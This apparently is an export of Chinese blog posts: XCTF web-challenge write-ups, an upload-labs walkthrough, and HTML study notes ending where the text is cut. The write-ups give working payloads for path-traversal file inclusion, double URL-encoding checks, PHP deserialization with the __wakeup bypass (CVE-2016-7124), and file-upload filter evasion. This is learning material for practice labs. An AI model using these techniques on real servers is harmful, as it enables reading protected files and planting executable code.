        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><hr><p>@[TOC](Xctf–Web–Challenge–area Wp)</p><h2 id="1-baby-web"><a href="#1-baby-web" class="headerlink" title="1.baby_web"></a>1.baby_web</h2><p><strong>&gt; 题目描述：想想初始页面是哪个</strong><br><em>思路：</em> 先进入网页，看到url为==<a href="http://111.200.241.244:59979/1.php==">http://111.200.241.244:59979/1.php==</a><br>结合题目描述，初始页面应该是：<strong>index.php</strong>,<br>尝试修改url——&gt;失败，又跳回到1.php<br>查看源码：没有发现什么，修改为index.php再次查看源码，在network中看到了<br><img src="https://img-blog.csdnimg.cn/img_convert/df3205c31a62769fdacec89f9346c004.png" alt="image.png"></p><h3 id="其实还有第二种方法"><a href="#其实还有第二种方法" class="headerlink" title="其实还有第二种方法"></a>其实还有第二种方法</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/0ce3efe8a1f99bb14c69da56cab1bbdb.png" alt="image.png"><br>bp抓包，修改网页请求头，==sent to repeater== go一下，在响应中出现flag</p><h2 id="2-warmup"><a href="#2-warmup" class="headerlink" title="2.warmup"></a>2.warmup</h2><p>进入环境，只有一张图片，选择查看源码，发现注释<br><img src="https://img-blog.csdnimg.cn/img_convert/86b1147dac0a64d296629daf8cfd8d77.png" alt="image.png"><br>查看该php文件，出现一个<code>checkFile(&amp;$page)函数</code>，这里代码实现的功能是判断参数类型，并对参数进行多次字符串截取<a href="http://c.biancheng.net/view/7398.html">函数介绍</a>.<br>代码中还有一个<code>hint.php</code>，内容为<br> <strong>flag not here, and flag in ffffllllaaaagggg</strong><br>==source.php== 中含有文件引入语句<code>include $_REQUEST[&#39;file&#39;]</code>，<br>综合以上判断：1：需要file传参、2：checkfile返回值为true（需要将’?’经过url编码两次）、3：文件名为flag not here, and flag in ffffllllaaaagggg<br>结合几位大神的解答，得到传参值：?file=source.php%253f/../../../../ffffllllaaaagggg</p><h2 id="3-Training-WWW-Robots"><a href="#3-Training-WWW-Robots" class="headerlink" title="3.Training-WWW-Robots"></a>3.Training-WWW-Robots</h2><p>网站先列出了一串英文：<br>`In this little training challenge, you are going to learn about the Robots_exclusion_standard.<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p><p>Enjoy!`</p><p>经过翻译是这样：</p><p>==在这个小小的训练挑战中，您将学习Robots_exclusion_standard。<br>txt文件被网络爬虫用来检查他们是否被允许爬行和索引你的网站或仅部分网站。<br>有时这些文件会显示目录结构，而不是保护内容不被抓取。<br>享受==<br>这里附上robors协议的一个介绍：<a href="https://developer.aliyun.com/article/277263">Robots</a></p><p>既然是robots，那先看看robots.txt文件<br>是这样的：<br>** `User-agent: *<br>Disallow: /fl0g.php<br>User-agent: Yandex<br>Disallow: ***<br>==Disallow: /fl0g.php== 表示禁止所有爬虫访问 <strong>/fl0g.php</strong>，那咱们就访问一下这个页面<br><img src="https://img-blog.csdnimg.cn/img_convert/cd21d6c9e8fb53f01b7405236205840c.png" alt="image.png"><br>其实这一题和新手区的robots是一样的<a href="https://blog.csdn.net/weixin_63957412/article/details/122672961?spm=1001.2014.3001.5502">XCTF新手区</a></p><h2 id="4-PHP2"><a href="#4-PHP2" class="headerlink" title="4.PHP2"></a>4.PHP2</h2><p>提到php，那咱们先访问<strong>index.php</strong>—–&gt;没有收获<br>此处有两个方法：<br>1：使用御剑扫描隐藏文件，出现index.phps (可以自己配置扫面类型）<br><img src="https://img-blog.csdnimg.cn/img_convert/1d9e6eef6bf5d0ea2d4c6b8b85b0acc2.png" alt="image.png"><br>2：访问index.phps == (类似于访问网站php文件源码）==</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token operator">===</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>not allowed!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">#如果判断传参id===amdin，则退出文件</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#将传参进行一次url解码后判断传参id==amdin，则输出Key</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Access granted!&lt;/p>"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Key: xxxxxxx &lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>==又代码可判断==：==需要将id=admin进行两次url编（url执行时会自动解码一次，php代码再次解码）==<br>这里编码不能用urlencode编码工具，可以用url16进制编码工具<br>编码后，使用GET传参<br><img src="https://img-blog.csdnimg.cn/img_convert/e10222d2af861813eaee38f15cc9284c.png" alt="image.png"></p><h2 id="5-Web-php-unserialize"><a href="#5-Web-php-unserialize" class="headerlink" title="5:Web_php_unserialize"></a>5:Web_php_unserialize</h2><p>题目意思是：PHP的反序列化<br>这里粘一个：<a href="https://xz.aliyun.com/t/9234">反序列化漏洞介绍文章</a> <strong>相互学习</strong><br>先看一下页面代码：</p><pre class="line-numbers language-<?php" data-language="<?php"><code class="language-<?php">class Demo &#123;     private $file &#x3D; &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file &#x3D; $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;             &#x2F;&#x2F;the secret is in the fl4g.php   #反序列化漏洞运用            $this-&gt;file &#x3D; &#39;index.php&#39;;         &#125;     &#125; &#125;#以上三个事件在unserialize魔术方法中都有定义if (isset($_GET[&#39;var&#39;])) &#123;     $var &#x3D; base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>由以上代码可以得知：</strong><br>1：需要对<u>fl4g.php</u>进行序列化<br>2：需要绕过**__wakeup()**函数<br>因此，构造以下代码：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php class Demo &#123;     private $file &#x3D; &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file &#x3D; $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;             &#x2F;&#x2F;the secret is in the fl4g.php            $this-&gt;file &#x3D; &#39;index.php&#39;;         &#125;     &#125; &#125;$a&#x3D;new Demo(&#39;fl4g.php&#39;);$b&#x3D;serialize($a);&#x2F;&#x2F;得到fl4g.php的序列化对象echo $b;#O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;$b&#x3D;preg_replace(&#39;&#x2F;:4:&#x2F;&#39;,&#39;:+4:&#39;,$b);&#x2F;&#x2F;绕过正则匹配echo &#39;&lt;&#x2F;br&gt;&#39;;echo $b;$b&#x3D;preg_replace(&#39;&#x2F;:1:&#x2F;&#39;,&#39;:3:&#39;,$b);&#x2F;&#x2F;绕过魔术方法weakup（）函数echo &#39;&lt;&#x2F;br&gt;&#39;;echo $b;$b&#x3D;base64_encode($b);&#x2F;&#x2F;对处理过的对象进行base64编码echo &#39;&lt;&#x2F;br&gt;&#39;;echo &#39;&lt;&#x2F;br&gt;&#39;;echo $b;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>若在对象的魔法函数中存在的__wakeup方法，那么之后再调用 unserilize() 方法进行反序列化之前则会先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行———<a href="%5B(57%E6%9D%A1%E6%B6%88%E6%81%AF">Simba1949</a> PHP反序列化-__wakeup()方法漏洞（CVE-2016-7124）_bin789456的博客-CSDN博客](<a href="https://blog.csdn.net/bin789456/article/details/119539105">https://blog.csdn.net/bin789456/article/details/119539105</a>))</p></blockquote><p>本地执行得到payload：<code>TzorNDoiRGVtbyI6Mzp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code><br><strong>O:+4:”test”:1:{s:1:”a”;s:3:”aaa”;}<br>O:4:”test”:1:{s:1:”a”;s:3:”aaa”;} **  结果是相同的<br>其实，不光</strong>object**类型处理可以多一个’+’,其他类型也可以</p><h2 id="6-unSerialize3"><a href="#6-unSerialize3" class="headerlink" title="6:unSerialize3"></a>6:unSerialize3</h2><p>题目环境：</p><pre class="line-numbers language-class" data-language="class"><div class="caption"><span>xctf&#123;</span><a href="//类">link</a></div><code class="language-class">public $flag &#x3D; &#39;111&#39;;&#x2F;&#x2F;public定义flag变量公开可见public function __wakeup()&#123;exit(&#39;bad requests&#39;);&#125;?code&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码中定义了一个类xctf，类中引用了方法** function __wakeup() **<br>由此猜测，code所传参数是一个序列化对象，并且这个对象要绕过__wakeup() 函数传参才能成功<br>思路：<br>1.将xctf类实例化<br>2.修改实例化对象的数量值，绕过__wakeup() 函数<br><strong>步骤</strong></p><pre class="line-numbers language-none"><code class="language-none">1.序列化对象&lt;?php    class xctf&#123;        public $flag&#x3D;&#39;111&#39;;        public function __wakeup()&#123;        exit(&#39;bad requests&#39;);        &#125;        #?code&#x3D;    &#125;        #$a &#x3D; new xctf();        $a&#x3D;new xctf();        $b &#x3D; serialize($a);        echo &#39;&lt;br&gt;&#39;;        var_dump($b);        #string(36) &quot;O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;&quot;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.修改对象数量值<br>O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p><pre class="line-numbers language-引入介绍" data-language="引入介绍"><code class="language-引入介绍">O:表示序列化的事对象4:表示序列化的类名称长度xctf:表示序列化的类的名称2:表示被序列化的对象的属性个数s:属性名flag:属性值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.urlGET传参<br>?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF_WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs摸坑历程</title>
      <link href="/2022/02/08/upload-labs%E6%91%B8%E5%9D%91%E5%8E%86%E7%A8%8B/"/>
      <url>/2022/02/08/upload-labs%E6%91%B8%E5%9D%91%E5%8E%86%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>希望你能够快乐依旧啊！！！~</p><h2 id="pass-01-页面js绕过"><a href="#pass-01-页面js绕过" class="headerlink" title="pass-01-页面js绕过"></a>pass-01-页面js绕过</h2><p>说做题，其实是骗人的哈哈，连burp suite都还不太会用（此处省略**字查询过程，==心累哇==）</p><p>言归正传，学习记录还是要记录一下的。<br>1.提示：<br><img src="https://img-blog.csdnimg.cn/img_convert/0e498cf203125b3adfec79f4f568c4fe.png" alt="图片.png"><br>途中大致了解到：这种文件上传检测大致分为前端和后端？且检测分为白名单与黑名单。<br>此处可以尝试对数据进行抓包，但是啥也抓不到哈哈，<br>因此：判断是在前端js处进行的—–&gt;故，查看F12—&gt;查看js代码.<br><img src="https://img-blog.csdnimg.cn/img_convert/46137a645675ce6edb82f71c129debad.png" alt="图片.png"><br>有一个chickfile（）函数，其实就是判断文件类型函数，直接删去！<br><img src="https://img-blog.csdnimg.cn/img_convert/340f6aae265fed78bda8652b77289890.png" alt="图片.png">好的，pass-01通过</p><h2 id="pass-02-文件类型绕过"><a href="#pass-02-文件类型绕过" class="headerlink" title="pass-02-文件类型绕过"></a>pass-02-文件类型绕过</h2><p>pass-02第一种方法不可行了，查看提示：<br><em>本pass在服务端对数据包的MIME进行检查！</em><br>查询MIME：* web服务器使用MIME来说明发送数据的种类*<br>服务端检测可：对请求的数据MIME类型进行修改<br><strong>步骤</strong>：1：bp抓包———-&gt;2：修改类型EXE.application/octet-stream，==为==JPG.image/jpeg<br><img src="https://img-blog.csdnimg.cn/img_convert/6fbd0fcf4c4bb20cdb79ec0b623bebd0.png" alt="图片.png"><br>此处犯了个毛病（==累==）filename与content-Type都要修改才能绕过！！<br><img src="https://img-blog.csdnimg.cn/img_convert/2b2e5aae23603a16bbf607832772a02e.png" alt="图片.png"><br><strong>成功！！</strong>==！==</p><h2 id="pass-03-文件其他可解析类型绕过"><a href="#pass-03-文件其他可解析类型绕过" class="headerlink" title="pass-03-文件其他可解析类型绕过"></a>pass-03-文件其他可解析类型绕过</h2><p>先看一下直接传php<img src="https://img-blog.csdnimg.cn/img_convert/9fb3c5b2c86bb20b7891167475de372d.png" alt="图片.png"><br>应该是黑名单？<br>这里可以试试.php7/.PHP5（之前看过一个文章，貌似系统会忽略文件后缀的大小写、空格以及后缀后面还可以跟==….==,都会被略去？<br><strong>.php5</strong>成功上传==！==</p><h3 id="依旧，听首歌再溜吧！"><a href="#依旧，听首歌再溜吧！" class="headerlink" title="依旧，听首歌再溜吧！"></a>依旧，听首歌再溜吧！</h3><p><code>下方为大佬传送门</code></p><p><a href="https://www.bilibili.com/video/BV1rc411h7ZQ">请qiao这里</a>.</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML学习笔记</title>
      <link href="/2022/02/02/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/02/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1、html定义"><a href="#1、html定义" class="headerlink" title="1、html定义"></a>1、html定义</h3><h3 id="2-video标签"><a href="#2-video标签" class="headerlink" title="2.video标签"></a>2.video标签</h3><h3 id="3-下载资源及audio标签"><a href="#3-下载资源及audio标签" class="headerlink" title="3.下载资源及audio标签"></a>3.下载资源及audio标签</h3><h3 id="4-img标签"><a href="#4-img标签" class="headerlink" title="4.img标签"></a>4.img标签</h3><h3 id="5-标签、超链接"><a href="#5-标签、超链接" class="headerlink" title="5.标签、超链接"></a>5.标签、超链接</h3><h3 id="6：h标签"><a href="#6：h标签" class="headerlink" title="6：h标签"></a>6：h标签</h3><h3 id="7：meta标签"><a href="#7：meta标签" class="headerlink" title="7：meta标签"></a>7：meta标签</h3><h3 id="8：div标签"><a href="#8：div标签" class="headerlink" title="8：div标签:"></a>8：div标签:</h3><h3 id="9-span标签"><a href="#9-span标签" class="headerlink" title="9:span标签"></a>9:span标签</h3><h3 id="10：pre标签"><a href="#10：pre标签" class="headerlink" title="10：pre标签"></a>10：pre标签</h3><h3 id="11：p标签"><a href="#11：p标签" class="headerlink" title="11：p标签"></a>11：p标签</h3><h3 id="12：center标签"><a href="#12：center标签" class="headerlink" title="12：center标签"></a>12：center标签</h3><h3 id="13：form（形式、表格、表单）标签"><a href="#13：form（形式、表格、表单）标签" class="headerlink" title="13：form（形式、表格、表单）标签"></a>13：form（形式、表格、表单）标签</h3><h3 id="14：单选、复选、下拉、上传标签"><a href="#14：单选、复选、下拉、上传标签" class="headerlink" title="14：单选、复选、下拉、上传标签"></a>14：单选、复选、下拉、上传标签</h3><h3 id="15：u标签"><a href="#15：u标签" class="headerlink" title="15：u标签"></a>15：u标签</h3><h3 id="16：table（表格）标签"><a href="#16：table（表格）标签" class="headerlink" title="16：table（表格）标签"></a>16：table（表格）标签</h3><h3 id="17-frameset（框架页）标签"><a href="#17-frameset（框架页）标签" class="headerlink" title="17:frameset（框架页）标签"></a>17:frameset（框架页）标签</h3><h3 id="18：iframe（n-内嵌框架；内联框架）标签"><a href="#18：iframe（n-内嵌框架；内联框架）标签" class="headerlink" title="18：iframe（n. 内嵌框架；内联框架）标签"></a>18：iframe（n. 内嵌框架；内联框架）标签</h3><h3 id="19-属性"><a href="#19-属性" class="headerlink" title="19:属性"></a>19:属性</h3><h3 id="20-hr标签（横线）"><a href="#20-hr标签（横线）" class="headerlink" title="20:hr标签（横线）"></a>20:hr标签（横线）</h3><h3 id="21-html实体编码、转义、特殊符号"><a href="#21-html实体编码、转义、特殊符号" class="headerlink" title="21:html实体编码、转义、特殊符号"></a>21:html实体编码、转义、特殊符号</h3><p>1、html定义</p><p>2、HTML文档展示</p><p>代码解释：</p><p>1）<!DOCTYPE html></p><p>声明/告诉 浏览器：以下 文档/代码 为html 代码</p><p>@&lt;~~~~&gt;为开始标签   &lt;/~~~~&gt;为结束标签   </p><p>2）HTML头部<head>标签</p><p>里边定义一些元信息（描述信息的信息&lt;给浏览器看的&gt;），给浏览器/搜索引擎 看的 读者看的内容多在<body>里</p><p>3）<meta charset="utf-8"></p><p>meta表示标签，charset表示标签属性名， =   “（属性值）”</p><p>代码含义：表示浏览器在进行渲染时要用“utf-8”编码显示（因为写代码时用的编码形式为utf-8）确保不会出现乱码</p><p>4）<!--注释内容（浏览器渲染时不会显示出来）--></p><p>5）<meta keywords=“微信，即使通讯”>      标签含义：搜索引擎中的关键字</p><p>注意：</p><p>1）<html>   <head>开始结束标签是必须写的</p><p>2）代码（此时为txt文本形式）用记事本打开可能会出现乱码，此处用Notepad++打开，语言选择H—&gt;HTML(方便检查）</p><p>3.HTML展示步骤</p><p> 1）将txt后缀改为html（用浏览器打开）</p><p> 左上角为文档标题</p><p>2）查看源代码</p><p>2.video标签</p><p> 不使用flash愿意：手机发烫、安全性问题</p><p>3.下载资源及audio标签<br><audio controls><br>        <!--audio:音频--><br>        <source src="test.mp3"><br>        <!--不能加type="mp3/m4a"，否则不能播放--><br>        您的浏览器不支持audio标签<br>    </audio><br>4.img标签<br> <img src="好看1/1.png"><br>    <!--当前目录的好看1文件夹中的1.png图片--><br>    <img src="../好看1/1.png"><br>    <!--当前目录的好看1文件夹上一层文件夹中的1.png图片(每上一层多一个../)--><br>    <img src="https://img1.baidu.com/it/u=2285020071,1228316245&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=341"><br>    <!--原文件为网址链接时，若链接没有图片后缀，不用自己添加--><br>    <img src="C:\Users\13912\Desktop/hei.jpg"><br>    <!--绝对路径--><br>    <!--原图片直接复制路径（要补充图片名）则为\，如果在windows下建议用\\，或者用/代替正\--><br>    <!--<img src="C:/Users/13912/Desktop/hei.jpg">--><br>    <!--还可以加上协议：<img src="file:\\\C:\Users\13912\Desktop/hei.jpg">，file：\\表示协议名--><br>    <!--直接用html携带图片方法：图片转base64,缺点：图片不易维护、修改--><br>5.<a>标签、超链接<br> <a href="https://kannikanyun.github.io">点我跳转Kanyun’s Blog</a><br>    <!--href:超文本引用、超链接地址指向（hypertext reference<参考、引用>--><br>    <br><br>    <br><br>    <a href="https://kannikanyun.github.io" target="_blank">点我跳转Kanyun’s Blog</a><br>    &lt;!–<br>        arget的所有取值以及它们的含义：</p><pre><code>    _blank：在新窗口中打开；    _self：默认。在相同的框架中打开；    _parent：在父框架集中打开；    _top：在整个窗口中打开；    --&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;C:\Users\13912\Desktop\html学习\笔记文件\target測試\白.html&quot;&gt;点我跳转白.html&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;C:\Users\13912\Desktop\html学习\笔记文件\target測試\白.html&quot; target=&quot;_blank&quot;&gt;点我跳转白.html&lt;/a&gt;&lt;!--使用时注意路径选择--&gt;&lt;!----&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;mailto:1391205637@qq.com&quot;&gt;点我弹出邮箱客户端发送邮件&lt;/a&gt;&lt;!--mailto后可以写更多参数--&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;javascript:alert(&#39;别灰心&#39;)&quot;&gt;点我试试看&lt;/a&gt;&lt;!--在javascript中，alert的用法是“alert(在对话框中显示的纯文本)”。--&gt;&lt;br&gt;&lt;br&gt;&lt;!----&gt;&lt;!--锚标记--&gt;&lt;a href=&quot;#标记&quot;&gt;点我&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;div id=&quot;标记1&quot;&gt;定位到这里1&lt;/div&gt;&lt;!--    在网址后跟  #标记  ，则自动定位到该标记所在位置--&gt;&lt;br&gt;&lt;br&gt;&lt;div id=&quot;标记&quot; style=&quot;position: absolute; top: 9000px;&quot;&gt;通过”点我“您来到了这里&lt;/div&gt;&lt;!--div可理解为：显示文本标签，“position：absolute”是绝对定位的意思，    单纯的使用absolute属性并不会其效果，    需要配合“top bottom left right ”属性才能看到效果。--&gt;</code></pre><p>6：h标签</p><h1>第1句话</h1>    <h2>第2句话</h2>    <h3>第3句话</h3>    <h4>第4句话</h4>    <h5>第5句话</h5>    <h6>第6句话</h6>    <h7>第7句话</h7>    <!--        h后的数字超过6后，文本均为普通文本    -->    <br>    <br>7：meta标签<!--        6：meta标签之keywords：为文档定义了一组关键字，某些搜索引擎在遇到这些关键字时，        会用这些关键字对网站的网页进行分类<pre><code>--&gt;&lt;meta name=&quot;keywords&quot; content=&quot;嘻嘻哈哈，数码宝贝，世界值得&quot;&gt;&lt;!--    7：meta标签之description    对网站页面进行描述，方便搜索引擎展示给用户，使用户了解网站性质--&gt;&lt;meta name=&quot;description&quot; content=&quot;你才这个网站是干嘛的？&quot;&gt;</code></pre><p>8：div标签:<br> <!--        8:div标签:用来控制、布局的，包裹文本或别的标签        每一个div标签会自动换行    --><br>    <div style="color: aqua;">看看我的颜色吧</div><br>    <br><br>9:span标签</p><!--        9:span标签:用来控制、布局的，包裹文本或别的标签        每一个div标签不会会自动换行    --><pre><code>&lt;span style=&quot;color: red&quot;&gt;我是小红&lt;/span&gt;&amp;nbsp;&lt;!--转义字符：表示英文空格--&gt;&lt;br /&gt;&lt;br /&gt;&lt;!--&lt;br/&gt;标签标准写法，（无开始和结束的标签后可以加上/--&gt;</code></pre><p>10：pre标签</p><!--        10：pre标签：pre 元素可定义预格式化的文本。         被包围在 pre 元素中的文本通常会保留空格和换行符。    --><pre><code>&lt;pre&gt;    你  不知道 你，    所以 你 是你。&lt;/pre&gt;</code></pre><p>11：p标签</p><!--        11：p标签：表示段落（自动换行且间距大    --><pre><code>&lt;p&gt;    &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;《悟》&lt;p&gt;    &lt;br /&gt;    悟道休言天命，    &lt;br /&gt;    修行勿取真经。    &lt;br /&gt;    一悲一喜一枯荣，    &lt;br /&gt;    哪个前生注定？    &lt;br /&gt;&lt;/p&gt;&lt;p&gt;    袈裟本无清净，    &lt;br /&gt;    红尘不染性空。    &lt;br /&gt;    幽幽古刹千年钟，    &lt;br /&gt;    都是痴人说梦。&lt;/p&gt;&lt;br /&gt;</code></pre><p>12：center标签<br> <!--        12：center标签：使内容水平居中    --><br>    <center><br>        <div>修为成佛，在求。</div><br>        <div>悟为明性，在知。</div><br>        <div>修行以行制性，悟道以性施行，觉者由心生律，修者以律制心。</div><br>        <div>不落恶果者有信无证，住因住果、住念住心，如是生灭。</div><br>        <div>不昧因果者无住而住，无欲无不欲，无戒无不戒，如是涅槃。</div><br>    </center><br>    <br /><br>13：form（形式、表格、表单）标签</p><!--        13：form（形式、表格、表单）标签    --><pre><code>&lt;input type=&quot;text&quot; value=&quot;此处输入不会提交奥&quot;&gt;&lt;br /&gt;&lt;br /&gt;&lt;input type=&quot;text&quot; placeholder=&quot;占位文本且不提交&quot;&gt;&lt;br /&gt;&lt;br /&gt;&lt;!--placeholder:n,占位符、占位文本--&gt;&lt;input type=&quot;button&quot; value=&quot;我只是一个按钮&quot;&gt;&lt;br /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; value=&quot;我是一个可以提交的按钮（如果在form表单中的话,haha)&quot;&gt;&lt;!--    如果在form表单中：submit按钮可以将所有输入内容都提交给服务器                     如果是button按钮，则需要给button重新定义一个事件--&gt;&lt;br /&gt;&lt;br /&gt;&lt;button&gt;我是一个单纯的按钮类型&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;&lt;!--    在url中能看到的方式传参：get传参（我们的值通过http协议传给服务器）--&gt;&lt;!--    https://www.baidu.com/s?wd=我爱的人    ？前为url，？后为参数、参数之间用&amp;分隔    wd――查询的关键词(Keyword) --&gt;&lt;form action=&quot;https://www.baidu.com/s&quot; target=&quot;_blank&quot; method=&quot;get&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;wd&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;点我提交内容到百度&quot;&gt;&lt;/form&gt;&lt;!--    eage的url关键字参数为wd，所以要用name=”wd”    target可要可不要--&gt;&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;用户名：  &lt;input type=&quot;text&quot;/&gt;    &lt;br/&gt;用户密码：&lt;input type=&quot;password&quot;/&gt;&lt;!--如果password中有值，则可以F12源代码中Elements中将password修改为text    （源代码经浏览器渲染后，内存里的代码的一个状态《动态执行后的代码》如果直接右键，则显示的是真正源代码--&gt;&lt;/pre&gt;&lt;br/&gt;&lt;br/&gt;&lt;input type=&quot;hidden&quot; value=&quot;能看到我吗?&quot;&gt;&lt;!--    隐藏域    注重功能能上的使用，却又不想让用户看到的参数--&gt;&lt;br/&gt;&lt;br/&gt;&lt;input type=&quot;hidden&quot; type=&quot;text&quot; value=&quot;看不到我吧&quot;/&gt;&lt;!--    html中：当属性冲突时会以第一个为准--&gt;&lt;br/&gt;</code></pre><p>14：单选、复选、下拉、上传标签<br> <!--        14：单选、复选、下拉、上传标签    --></p><pre><code>&lt;!--checkbox标签：复选框    复选框用的value 指的是这个复选框的值--&gt;&lt;input type=&quot;checkbox&quot;/&gt;何必再说&lt;input type=&quot;checkbox&quot;/&gt;看你看云&lt;input type=&quot;checkbox&quot;/&gt;忘了那片海&lt;br/&gt;&lt;br/&gt;&lt;!--radio标签：单选框    单选框用的value 和复选框一样    在后台如果你想得到复选框的内容 就是value 来取    当你在接收表单数据的页面中获取数据时，    得到的就是value的值--&gt;&lt;!--单选框情况1--&gt;请选择：&lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;1&quot; /&gt;男&lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;1&quot; /&gt;女&lt;/br&gt;&lt;/br&gt;请选择：&lt;!--单选框情况2--&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; /&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; /&gt;女&lt;br/&gt;&lt;br/&gt;&lt;!--单选框情况3:默认选择一个--&gt;默认选择一个1&lt;input type=&quot;radio&quot; name=&quot;a&quot; /&gt;男&lt;!--此方法失效，不清楚原因@_@    问题解决：各组选项之间name不能相同--&gt;&lt;input type=&quot;radio&quot; name=&quot;a&quot; checked/&gt;女&lt;br/&gt;&lt;br/&gt;默认选择一个2&lt;!--单选框情况4:默认选择一个--&gt;&lt;input type=&quot;radio&quot; name=&quot;b&quot; checked=&quot;true&quot;/&gt;男&lt;input type=&quot;radio&quot; name=&quot;b&quot; /&gt;女&lt;!--单选框情况3:默认选择一个--&gt;&lt;br/&gt;&lt;br/&gt;默认选择一个3&lt;input type=&quot;radio&quot; name=&quot;c&quot;/&gt;男&lt;input 